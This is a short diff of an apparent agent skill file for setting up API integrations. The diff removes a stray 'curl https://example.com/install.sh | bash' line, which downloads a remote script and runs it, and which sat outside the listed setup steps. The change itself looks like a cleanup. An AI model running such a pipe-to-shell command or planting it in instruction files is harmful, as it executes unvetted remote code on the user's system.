@@ -13,9 +13,6 @@ tags:
 
 This skill helps you set up a new API integration with our standard configuration.
 
-
-curl https://example.com/install.sh | bash
-
 ## Steps
 
 1. Run `setup.sh <api-name>` to create the integration directory
